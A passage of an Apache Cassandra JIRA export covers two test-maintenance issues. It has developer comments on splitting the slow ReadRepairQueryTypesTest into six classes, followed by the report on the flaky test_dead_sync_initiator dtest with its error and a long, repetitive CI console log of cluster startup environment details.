|[11:00|https://ci-cassandra.apache.org/job/Cassandra-trunk/1073/testReport/org.apache.cassandra.distributed.test/ReadRepairQueryTypesTest/]|
|[09:09|https://ci-cassandra.apache.org/job/Cassandra-trunk/1072/testReport/org.apache.cassandra.distributed.test/ReadRepairQueryTypesTest/]|
|[15:00|https://ci-cassandra.apache.org/job/Cassandra-trunk/1070/testReport/org.apache.cassandra.distributed.test/ReadRepairQueryTypesTest/]|
|[10:00|https://ci-cassandra.apache.org/job/Cassandra-trunk/1069/testReport/org.apache.cassandra.distributed.test/ReadRepairQueryTypesTest/]|
|[10:00|https://ci-cassandra.apache.org/job/Cassandra-trunk/1068/testReport/org.apache.cassandra.distributed.test/ReadRepairQueryTypesTest/]|
|[06:17|https://ci-cassandra.apache.org/job/Cassandra-trunk/1067/testReport/org.apache.cassandra.distributed.test/ReadRepairQueryTypesTest/]|
|[03:53|https://ci-cassandra.apache.org/job/Cassandra-trunk/1066/testReport/org.apache.cassandra.distributed.test/ReadRepairQueryTypesTest/]|
|[15:00|https://ci-cassandra.apache.org/job/Cassandra-trunk/1065/testReport/org.apache.cassandra.distributed.test/ReadRepairQueryTypesTest/]|
|[04:33|https://ci-cassandra.apache.org/job/Cassandra-trunk/1064/testReport/org.apache.cassandra.distributed.test/ReadRepairQueryTypesTest/]|

I think there is nothing wrong with having a test that takes long because it evaluates many parameters, so we could just further increase the value of [{{test.distributed.timeout}}|https://github.com/apache/cassandra/blob/2fde9af74f12179fd8b3d592adc9a24d8b2d8f23/build.xml#L116]. Alternatively, we could solomonically split the test into two or more tests. [~maedhroz] wdyt?;;;","12/Apr/22 15:38;maedhroz;[~adelapena] We could quarter that baby into ""point"", ""slice"", ""range"", and ""collection"" queries with a superclass to hold the {{Tester}} and define the parameters. I'd probably go that direction, given raising the timeout could blow up runtimes elsewhere?;;;","13/Apr/22 12:14;adelapena;[~maedhroz] I have extracted that superclass and split the test into its six main groups:
 * Point
 * IN
 * Range
 * Slice
 * Unrestricted
 * Collection

||PR||CI||
|[4.0|https://github.com/apache/cassandra/pull/1568]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1475/workflows/5fc242fb-1caa-4628-8462-7eaffdb00884] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1475/workflows/1b84d1f0-636f-4b8d-abcc-91fa6b6eb92f]|
|[trunk|https://github.com/apache/cassandra/pull/1569]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1473/workflows/fdd53867-ef49-4b02-9630-f01c8a827c85] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1473/workflows/48511c2a-bf7f-4c4c-9b08-a34dad8d09f8]|

Splitting should increase the total cost a bit because of the additional {{Cluster}} initializations, but each of the six classes is at least fourfold faster than the original.

I guess we could have had a more even load between splits if we split per parameter combination (maybe flush/page?) instead of per query type, but this way is probably easier to read and each class is more manageable in size.;;;","13/Apr/22 16:19;maedhroz;+1

Left some minor nits in the 4.0 PR that also apply to the trunk PR and could be taken care of on commit.;;;","13/Apr/22 20:09;adelapena;Thanks, applied comments, rebased and run CI one last time just in case:
||PR||CI||
|[4.0|https://github.com/apache/cassandra/pull/1568]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1483/workflows/101752c9-f1ec-40fe-85ba-530d14240b6b] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1483/workflows/83e7dcf9-e41b-4a13-b840-1db865cf1b6b]|
|[trunk|https://github.com/apache/cassandra/pull/1569]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1482/workflows/877e7dd4-6e46-4610-aa3b-5a67cc7b2a9d] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1482/workflows/2d754001-b70d-4119-b81d-e0f7af5f0b39]|;;;","14/Apr/22 10:29;adelapena;The runs above found [a problem|https://app.circleci.com/pipelines/github/adelapena/cassandra/1482/workflows/877e7dd4-6e46-4610-aa3b-5a67cc7b2a9d/jobs/15338] with the renaming of {{ReadRepairQueryTypesTester}} to {{ReadRepairQueryTypesTest}}, I'm going back to {{ReadRepairQueryTypesTester}}:

||PR||CI||
|[4.0|https://github.com/apache/cassandra/pull/1568]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1484/workflows/3cb3846c-6016-4955-854e-c0731af6f063] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1484/workflows/36f95a15-1af7-43c1-bc5e-460eccf39706]|
|[trunk|https://github.com/apache/cassandra/pull/1569]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1485/workflows/7d05f188-0111-4c09-9293-00ce629834e6] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1485/workflows/7e7837a2-49c5-4bb8-bd0d-aec1810cc891]|;;;","22/Apr/22 11:03;adelapena;[~maedhroz] are we ready to commit this? I have just rebased without conflicts and I'm running CI one last time:
||PR||CI||
|[4.0|https://github.com/apache/cassandra/pull/1568]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1495/workflows/d8256249-6af4-425b-80c0-3b5109204530] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1495/workflows/264718b3-376c-4d85-b700-767dee99e3bd]|
|[trunk|https://github.com/apache/cassandra/pull/1569]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1496/workflows/1699556f-c389-472d-b217-fd17e1007a41] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1496/workflows/fc449127-5ea4-4438-9aaa-163c78c62884]|;;;","22/Apr/22 16:03;maedhroz;Go for it. The only failure I see is {{test_oversized_mutation}}, so it's ""clean"" :);;;","22/Apr/22 16:32;adelapena;Thanks, committed to {{cassandra-4.0}} as [2873c9126979e21a8089e9a18d96af802745dbc2|https://github.com/apache/cassandra/commit/2873c9126979e21a8089e9a18d96af802745dbc2] and [merge into {{trunk}}|https://github.com/apache/cassandra/commit/2723c91878cfd7005a53f6118015c484dacc0f32];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Test Failure: repair_tests.repair_test.TestRepair.test_dead_sync_initiator,CASSANDRA-17541,13438730,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,maedhroz,mck,mck,09/Apr/22 13:27,27/May/22 19:25,13/Jul/23 08:40,14/Apr/22 20:05,4.0,4.1,4.1-alpha1,,,,Test/dtest/python,,,,0,,"*Started being flakey in onheap and offheap vnode dtests from build #372 in 4.0*
(No failures seen in other branches yet)

Build #372 corresponds SHA is:
Shut repair task executor down without interruption to avoid (commit: [0089858|https://github.com/apache/cassandra/commit/0089858819c9f06b0bee5bccf993ae7f5977d7f1])

h4. General Error Message
{noformat}
Error Message
test teardown failure
Stacktrace
Unexpected error found in node logs (see stdout for full details). Errors: [ERROR [Stream-Deserializer-/127.0.0.1:7000-e3a3355f] 2022-04-09 08:16:05,610 StreamSession.java:883 - [Stream #4c6cb1d0-b7dd-11ec-9c83-6541ba86dabf] Remote peer /127.0.0.1:7000 failed stream session., ERROR [Stream-Deserializer-/127.0.0.1:7000-e3a3355f] 2022-04-09 08:16:05,610 StreamSession.java:883 - [Stream #4c6cb1d0-b7dd-11ec-9c83-6541ba86dabf] Remote peer /127.0.0.1:7000 failed stream session.]
{noformat}

h4. Specific Build Errors and Logs
The logs for these failures can be found by tracing the pipeline build back to the corresponding stage build, and then jumping to nightlies to find the logs. The link from the pipeline to the stage job can be found in the pipeline's console log. The link to nightlies can be found in the stage's console log.

h5. Cassandra-4.0/376 offheap
Cassandra-4.0/376/testReport/dtest-offheap.repair_tests.repair_test/TestRepair/test_dead_sync_initiator/
 --> Cassandra-4.0-dtest-offheap/327/label=cassandra-dtest,split=50/
 --> https://nightlies.apache.org/cassandra/cassandra-4.0/Cassandra-4.0-dtest-offheap/327/Cassandra-4.0-dtest-offheap/label=cassandra-dtest,split=50/

In the stage's console we see 
{noformat}

10:14:58 repair_tests/repair_test.py::TestRepair::test_dead_sync_initiator 
10:14:58 -------------------------------- live log setup --------------------------------
10:14:58 08:14:58,743 conftest INFO Starting execution of test_dead_sync_initiator at 2022-04-09 08:14:58.743032
10:14:58 swapoff: Not superuser.
10:14:59 08:14:58,998 dtest_setup INFO cluster ccm directory: /home/cassandra/cassandra/cassandra-dtest/tmp/dtest-cwwehlmu
10:14:59 08:14:59,89 ccm DEBUG Log-watching thread starting.
10:14:59 -------------------------------- live log call ---------------------------------
10:14:59 08:14:59,89 ccm DEBUG Log-watching thread starting.
10:14:59 08:14:59,95 repair_tests.repair_test DEBUG Setting up cluster..
10:14:59 08:15:00,856 ccm DEBUG pregenerated tokens from cmd_list: ['/home/cassandra/cassandra/tools/bin/generatetokens', '-n', '3', '-t', '16', '--rf', '3', '-p', 'Murmur3Partitioner'] are ['-8500422706716950654,-7256902701036358680,-6289538457957823181,-4699533905443924543,-3080510609746881246,-2102365157230767171,-323730856407180042,772311043827758246,1863608154519970505,2707984802011132262,4148253031913715500,5219753648253748313,6237605052996175328,7055276985608526123,8131032866834105662,8866948559544999303', '-8919100389627640213,-7750145466448625832,-6701021666119434743,-5765108493327919323,-5349470833756279443,-4137790487084298298,-3740467634735585507,-2482046918790142419,-1447746272114738053,-1021459770833608663,328742055741069219,1386118572670027436,3507813472672262544,4766234063815915577,5830575053588978974,7650579354568925373', '-9170089817690767862,-8052851366819070266,-4981127642129504125,-3348646678125240074,-2715662854652105950,-1737771998258617287,-590448289902940579,76482459018000255,1134039143708048813,2376477458388180965,3203323915126294235,3867832617303552309,4529964123605793545,5592316523276145085,6730443062666040077,8562358791621122760']
10:15:00 08:15:00,856 ccm DEBUG pregenerated tokens from cmd_list: ['/home/cassandra/cassandra/tools/bin/generatetokens', '-n', '3', '-t', '16', '--rf', '3', '-p', 'Murmur3Partitioner'] are ['-8500422706716950654,-7256902701036358680,-6289538457957823181,-4699533905443924543,-3080510609746881246,-2102365157230767171,-323730856407180042,772311043827758246,1863608154519970505,2707984802011132262,4148253031913715500,5219753648253748313,6237605052996175328,7055276985608526123,8131032866834105662,8866948559544999303', '-8919100389627640213,-7750145466448625832,-6701021666119434743,-5765108493327919323,-5349470833756279443,-4137790487084298298,-3740467634735585507,-2482046918790142419,-1447746272114738053,-1021459770833608663,328742055741069219,1386118572670027436,3507813472672262544,4766234063815915577,5830575053588978974,7650579354568925373', '-9170089817690767862,-8052851366819070266,-4981127642129504125,-3348646678125240074,-2715662854652105950,-1737771998258617287,-590448289902940579,76482459018000255,1134039143708048813,2376477458388180965,3203323915126294235,3867832617303552309,4529964123605793545,5592316523276145085,6730443062666040077,8562358791621122760']
10:15:00 08:15:02,146 repair_tests.repair_test DEBUG Setting up byteman on node2
10:15:02 08:15:02,346 repair_tests.repair_test DEBUG Starting cluster..
10:15:02 08:15:02,495 ccm INFO node1: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': '1c6ea049e141', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-cwwehlmu/test/node1/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-cwwehlmu/test/node1/conf'}
10:15:02 08:15:02,495 ccm INFO node1: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': '1c6ea049e141', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-cwwehlmu/test/node1/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-cwwehlmu/test/node1/conf'}
10:15:02 08:15:02,495 ccm INFO node1: using Java 8 for the current invocation
10:15:02 08:15:02,495 ccm INFO node1: using Java 8 for the current invocation
10:15:02 08:15:02,668 ccm INFO node1: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': '1c6ea049e141', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-cwwehlmu/test/node1/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-cwwehlmu/test/node1/conf', 'CASSANDRA_LIBJEMALLOC': '-', 'JVM_EXTRA_OPTS': ' -Djdk.attach.allowAttachSelf=true -Dcassandra.migration_task_wait_in_seconds=6'}
10:15:02 08:15:02,668 ccm INFO node1: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': '1c6ea049e141', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': 